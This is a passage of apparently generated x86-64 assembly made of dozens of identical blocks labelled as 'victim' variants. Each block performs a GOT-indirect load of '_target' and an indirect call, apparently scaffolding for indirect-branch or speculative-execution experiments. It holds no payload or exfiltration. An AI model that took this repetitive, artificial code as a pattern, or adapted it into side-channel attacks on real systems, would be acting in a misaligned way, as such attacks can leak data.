	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 187
.Lvictim_win0_var187:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 188
.Lvictim_win0_var188:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 189
.Lvictim_win0_var189:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 190
.Lvictim_win0_var190:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 191
.Lvictim_win0_var191:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 192
.Lvictim_win0_var192:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 193
.Lvictim_win0_var193:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 194
.Lvictim_win0_var194:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 195
.Lvictim_win0_var195:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 196
.Lvictim_win0_var196:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 197
.Lvictim_win0_var197:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 198
.Lvictim_win0_var198:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 199
.Lvictim_win0_var199:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 200
.Lvictim_win0_var200:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 201
.Lvictim_win0_var201:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 202
.Lvictim_win0_var202:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 203
.Lvictim_win0_var203:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 204
.Lvictim_win0_var204:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 205
.Lvictim_win0_var205:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 206
.Lvictim_win0_var206:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 207
.Lvictim_win0_var207:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 208
.Lvictim_win0_var208:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 209
.Lvictim_win0_var209:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 210
.Lvictim_win0_var210:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 211
.Lvictim_win0_var211:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 212
.Lvictim_win0_var212:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 213
.Lvictim_win0_var213:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 214
.Lvictim_win0_var214:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 215
.Lvictim_win0_var215:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 216
.Lvictim_win0_var216:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 217
.Lvictim_win0_var217:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 218
.Lvictim_win0_var218:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 219
.Lvictim_win0_var219:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 220
.Lvictim_win0_var220:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 221
.Lvictim_win0_var221:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 222
.Lvictim_win0_var222:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 223
.Lvictim_win0_var223:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 224
.Lvictim_win0_var224:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 225
.Lvictim_win0_var225:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 226
.Lvictim_win0_var226:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 227
.Lvictim_win0_var227:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 228
.Lvictim_win0_var228:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 229
.Lvictim_win0_var229:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 230
.Lvictim_win0_var230:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 231
.Lvictim_win0_var231:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 232
.Lvictim_win0_var232:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 233
.Lvictim_win0_var233:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 234
.Lvictim_win0_var234:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 235
.Lvictim_win0_var235:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 236
.Lvictim_win0_var236:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 237
.Lvictim_win0_var237:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 238
.Lvictim_win0_var238:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 239
.Lvictim_win0_var239:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 240
.Lvictim_win0_var240:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 241
.Lvictim_win0_var241:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 242
.Lvictim_win0_var242:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 243
.Lvictim_win0_var243:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 244
.Lvictim_win0_var244:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 245
.Lvictim_win0_var245:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 246
.Lvictim_win0_var246:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 247
.Lvictim_win0_var247:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 248
.Lvictim_win0_var248:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 249
.Lvictim_win0_var249:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 250
.Lvictim_win0_var250:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 251
.Lvictim_win0_var251:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 252
.Lvictim_win0_var252:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 253
.Lvictim_win0_var253:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 254
.Lvictim_win0_var254:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 255
.Lvictim_win0_var255:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 256
.Lvictim_win0_var256:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 257
.Lvictim_win0_var257:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 258
.Lvictim_win0_var258:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 259
.Lvictim_win0_var259:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 260
.Lvictim_win0_var260:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 261
.Lvictim_win0_var261:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 262
.Lvictim_win0_var262:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 263
.Lvictim_win0_var263:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 264
.Lvictim_win0_var264:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 265
.Lvictim_win0_var265:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 266
.Lvictim_win0_var266:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 267
.Lvictim_win0_var267:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 268
.Lvictim_win0_var268:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 269
.Lvictim_win0_var269:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 270
.Lvictim_win0_var270:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 271
.Lvictim_win0_var271:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 272
.Lvictim_win0_var272:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 273
.Lvictim_win0_var273:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 274
.Lvictim_win0_var274:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 275
.Lvictim_win0_var275:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 276
.Lvictim_win0_var276:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 277
.Lvictim_win0_var277:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 278
.Lvictim_win0_var278:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 279
.Lvictim_win0_var279:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 280
.Lvictim_win0_var280:
